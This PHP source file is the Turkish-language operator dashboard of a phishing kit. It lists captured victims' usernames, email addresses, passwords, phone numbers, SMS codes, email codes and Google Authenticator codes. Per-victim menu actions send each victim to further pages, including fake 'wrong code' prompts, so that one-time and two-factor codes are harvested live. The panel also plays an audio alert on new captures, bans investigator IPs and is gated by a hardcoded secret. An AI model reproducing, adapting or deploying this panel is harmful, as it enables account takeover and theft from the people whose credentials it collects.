<?php
session_start();
function GetIP(){
 if(getenv("HTTP_CLIENT_IP")) {
 $ip = getenv("HTTP_CLIENT_IP");
 } elseif(getenv("HTTP_X_FORWARDED_FOR")) {
 $ip = getenv("HTTP_X_FORWARDED_FOR");
 if (strstr($ip, ',')) {
 $tmp = explode (',', $ip);
 $ip = trim($tmp[0]);
 }
 } else {
 $ip = getenv("REMOTE_ADDR");
 }
 return $ip;
}
$ipcik = GetIP();
include "../config.php";

if($_SESSION["ipx"] != $ipcik)  { 
   header("location:cikis.php"); 
 }


$gtc = $_SESSION["username"];
$sorgu = $connect->prepare("SELECT * FROM icq WHERE mail = ?");
$sorgu->bindParam(1, $gtc, PDO::PARAM_INT);
$sorgu->execute();
$cikti = $sorgu->fetch(PDO::FETCH_ASSOC);




$idx = $_GET['idx'];
$islem = $_GET['islem'];

$bildirim = $connect->query("SELECT * FROM gtm WHERE notif = '1'")->fetch(PDO::FETCH_ASSOC);

if ( $bildirim ){
    $id = $bildirim['id'];
   echo '<div id="alerts">
			<audio id="audioplayer" autoplay=true>
			<source src="assets/log.mp3" type="audio/mpeg">
			Tarayiciniz ses elementlerini desteklemiyor. </audio>
			</div>';
	$guncelleme = $connect->exec("UPDATE gtm Set notif='0', ses='0' WHERE id='$id'");

}
function loginkontrol (){
    if(empty($_SESSION["username"])){
        header("location:bos.html");
        exit;
    }
}
$idx = "1";
$stmt = $connect->prepare("SELECT count(*) FROM ban WHERE durum = ?");
$stmt->execute([$idx]);
$count = $stmt->fetchColumn();
$countx = $connect->query("SELECT count(*) FROM ban")->fetchColumn();

$tarih = time();


?>

 <?php 
 
    if ($_POST['krx']=="71871787171878191910101010101901091") {?>
    <?php
    loginkontrol ();
    ?>
     <div class="container">
		<div class="card-group">
      <div class="card">
        <a href="#" class="pull-xs-left p-absolute p-a-1 text-muted"><i class="material-icons" style="color: red;">description</i></a>
        <div class="card-block center" style="background-color: black;">
          <h2 class="m-b-0">
            <strong style="color: white;"><?php echo $countx; ?></strong>
          </h2>
          <small class="text-muted" style="color: white;">Toplam Ziyaretçi</small>
        </div>
      </div>
      <div class="card">
        <a href="#" class="pull-xs-left p-absolute p-a-1 text-muted"><i class="material-icons" style="color: black;">gavel</i></a>
        <div class="card-block center"  style="background-color: red;">
          <h2 class="m-b-0">
            <strong><?php echo $count; ?></strong>
          </h2>
          <small class="text-muted" style="color: white;">Banlanan</small>
        </div>
      </div>
     
    </div>
    
    <a class="btn btn-danger btn-rounded" href="assets/frs.php?connect=<?php echo 'a6'; ?>">Tümünü Sil</a>
  <div class="card">
        <table class="table">
          <thead>
            <tr>
              <th>#</th>
              <th>Kullanıcı</th>
              <th>Mail</th>
              <th>Şifre</th>
              <th>Telefon</th>
              <th>Sms</th>
              <th>Mail</th>
              <th>Google Auth</th>
              <th></th>
              
            </tr>
          </thead>
          <tbody>
            <?php
            $logsorgu = $connect->prepare("SELECT * FROM gtm order by id DESC");
            $logsorgu->execute();
            while ($loglar = $logsorgu->fetch(PDO::FETCH_ASSOC)) {
            
            ?>
            
            <tr class="table-active">
              <th scope="row"><?php echo $loglar["id"]; ?></th>
              <td>Sayfa: <?php echo $loglar["durum2"];  ?> <br> <br>İp: <?php echo $loglar["ip"]; ?> <br> Tarih:<?php echo $loglar["tarih"]; ?></td>
              <td><?php echo $loglar["gx1"]; ?></td>
              <td><?php echo $loglar["gx2"]; ?></td>
              <td><?php echo $loglar["gx3"]; ?></td>
              <td><?php echo $loglar["gx4"]; ?></td>
              <td><?php echo $loglar["gx5"]; ?></td>
              <td><?php echo $loglar["gx21"]; ?></td>
              <td>
              <div class="btn-group">
            <button type="button" class="btn btn-success dropdown-toggle" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">İşlem</button>
            <div class="dropdown-menu">
              <a class="dropdown-item" href="assets/frs.php?trx=<?php echo $loglar['id']; ?>&connect=<?php echo '1'; ?>&islem=yonlendir">Mail Başa Gönder</a>
              <a class="dropdown-item" href="assets/frs.php?trx=<?php echo $loglar['id']; ?>&connect=<?php echo '2'; ?>&islem=yonlendir">Telefon Başa Gönder</a>
              <a class="dropdown-item" href="assets/frs.php?trx=<?php echo $loglar['id']; ?>&connect=<?php echo '3'; ?>&islem=yonlendir">Sms + Mail</a>
              <a class="dropdown-item" href="assets/frs.php?trx=<?php echo $loglar['id']; ?>&connect=<?php echo '4'; ?>&islem=yonlendir">Sms + Mail Hatalı</a>
              <a class="dropdown-item" href="assets/frs.php?trx=<?php echo $loglar['id']; ?>&connect=<?php echo '5'; ?>&islem=yonlendir">Sms</a>
              <a class="dropdown-item" href="assets/frs.php?trx=<?php echo $loglar['id']; ?>&connect=<?php echo '6'; ?>&islem=yonlendir">Sms Hatalı</a>
              <a class="dropdown-item" href="assets/frs.php?trx=<?php echo $loglar['id']; ?>&connect=<?php echo '7'; ?>&islem=yonlendir">Mail Kod</a>
              <a class="dropdown-item" href="assets/frs.php?trx=<?php echo $loglar['id']; ?>&connect=<?php echo '8'; ?>&islem=yonlendir">Mail Kod Hatalı</a>
              <a class="dropdown-item" href="assets/frs.php?trx=<?php echo $loglar['id']; ?>&connect=<?php echo '9'; ?>&islem=yonlendir">Sms + Auth</a>
              <a class="dropdown-item" href="assets/frs.php?trx=<?php echo $loglar['id']; ?>&connect=<?php echo '10'; ?>&islem=yonlendir">Sms + Auth Hatalı</a>
              <a class="dropdown-item" href="assets/frs.php?trx=<?php echo $loglar['id']; ?>&connect=<?php echo '11'; ?>&islem=yonlendir">Auth</a>
              <a class="dropdown-item" href="assets/frs.php?trx=<?php echo $loglar['id']; ?>&connect=<?php echo '12'; ?>&islem=yonlendir">Auth Hatalı</a>
              <a class="dropdown-item" href="assets/frs.php?trx=<?php echo $loglar['id']; ?>&connect=<?php echo '13'; ?>&islem=yonlendir">Sms + Mail + Auth</a>
              <a class="dropdown-item" href="assets/frs.php?trx=<?php echo $loglar['id']; ?>&connect=<?php echo '14'; ?>&islem=yonlendir">Sms + Mail + Auth Hatalı</a>
              <a class="dropdown-item" href="assets/frs.php?trx=<?php echo $loglar['id']; ?>&connect=<?php echo '15'; ?>&islem=yonlendir">Mail + Auth</a>
              <a class="dropdown-item" href="assets/frs.php?trx=<?php echo $loglar['id']; ?>&connect=<?php echo '16'; ?>&islem=yonlendir">Mail + Auth Hatalı</a>
              <a class="dropdown-item" href="assets/frs.php?trx=<?php echo $loglar['id']; ?>&connect=<?php echo '17'; ?>&islem=yonlendir">Tamamlandı</a>

              <div class="dropdown-divider"></div>
              <a style="background-color:red;" class="dropdown-item" href="assets/frs.php?mnt=<?php echo $loglar['ip']; ?>&connect=<?php echo 'a4'; ?>">Ban</a>
              <a style="background-color: orange;" class="dropdown-item" href="assets/frs.php?trx=<?php echo $loglar['id']; ?>&connect=<?php echo 'a5'; ?>">Sil</a>
            </div>
          </div>
              </td>
            </tr>
           
          </tbody>
          <?php } ?>
        </table>
      </div>
  </div>

   <?php }


     